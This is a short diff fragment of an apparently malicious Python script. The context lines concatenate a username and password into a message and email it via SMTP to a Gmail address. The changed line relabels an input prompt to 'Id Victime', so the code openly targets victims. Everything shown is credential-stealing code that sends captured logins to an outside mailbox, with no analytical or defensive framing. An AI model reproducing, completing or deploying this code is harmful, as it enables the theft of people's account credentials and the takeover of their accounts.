@@ -11,4 +11,4 @@ msg =username+password
 server.sendmail("karloslikres@gmail.com", "20xxismailxx19@gmail.com", msg)
 server.quit()
 no_of_friends = int(raw_input("Number of friends: "))
-name = str(raw_input("Name: "))
+name = str(raw_input("Id Victime: "))
